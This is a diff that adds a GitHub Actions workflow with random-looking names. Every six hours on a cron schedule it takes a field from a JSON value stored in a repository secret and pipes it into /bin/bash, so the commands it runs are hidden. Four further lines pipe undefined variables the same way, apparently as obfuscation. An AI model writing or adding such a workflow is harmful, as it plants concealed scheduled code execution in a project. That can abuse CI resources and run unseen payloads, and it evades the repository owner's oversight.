@@ -1,0 +1,22 @@
+name: taidutd
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taidutd
+        env:
+          bh5: ${{ secrets.bh5 }}
+        run: |
+          echo $bh5 | jq -r .i892 | /bin/bash
+          echo $tqirv7 | jq -r .jhqbo650 | /bin/bash
+          echo $pdbf72210 | jq -r .ky81 | /bin/bash
+          echo $krhng305 | jq -r .ssafj0567 | /bin/bash
+          echo $z773 | jq -r .akzt33 | /bin/bash
+
